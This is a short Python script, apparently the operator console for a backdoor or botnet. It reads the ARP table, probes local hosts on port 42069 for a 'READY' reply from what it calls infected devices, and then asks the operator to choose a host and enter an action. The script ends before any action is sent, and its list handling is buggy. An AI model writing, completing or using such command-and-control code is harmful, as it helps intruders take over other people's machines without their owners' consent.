import requests, os,re, colorama
print("Finding devices infected...")
devices = ["127.0.0.1"]
for device in os.popen('arp -a'): devices.append(device)
pattern=re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
copy2=devices
for device in devices:
    copy2[copy2.index(device)] = pattern.search(device)[0]
devices = copy2
copy=devices
tmp=[]
for device in devices:
    try:
        r=requests.post("http://"+device+":42069/check")
    except:
        class r:
            text=None
    if r.text == "READY":
        tmp.append(device)
        print(device)
    else:
        copy.remove(device)
devices = copy
while True:
    for device in devices:
        print(colorama.Fore.GREEN,device,colorama.Fore.RESET)
    print(colorama.Fore.RED,"please input the ip of the device to connect to",colorama.Fore.RESET)
    ans=input(f"{colorama.Fore.RED}{colorama.Back.WHITE}>{colorama.Style.RESET_ALL}")
    if not pattern.match(ans) or ans not in devices:
        print("please input an ip from the list")
    elif ans in devices and pattern.match(ans):
        if not ans == "127.0.0.1":
            print(f"connecting to {colorama.Fore.CYAN}{ans}{colorama.Fore.RESET}")
        elif ans == "127.0.0.1":
            print(f"connecting to {colorama.Fore.CYAN}SELF{colorama.Fore.RESET}")
        connection=ans+":42069"
        r = requests.post(f"http://{connection}/check")
        if r.text == "READY":
            ans = input(f"awaiting action:\n{colorama.Fore.RED}{colorama.Back.WHITE}>{colorama.Fore.RESET}")
            print(colorama.Style.RESET_ALL)